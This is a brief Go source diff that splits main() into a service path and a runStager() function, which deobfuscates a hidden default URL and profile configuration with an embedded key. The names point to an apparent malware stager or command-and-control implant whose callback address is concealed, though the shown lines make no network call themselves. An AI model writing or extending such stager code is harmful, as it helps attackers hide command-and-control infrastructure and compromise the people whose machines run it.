@@ -66,6 +66,13 @@ var (
 )
 
 func main() {
+	if runService() {
+		return
+	}
+	runStager()
+}
+
+func runStager() {
 	if ObfKeyHex != "" {
 		DefaultURL = deobf(DefaultURL, ObfKeyHex)
 		ProfileJSON = deobf(ProfileJSON, ObfKeyHex)
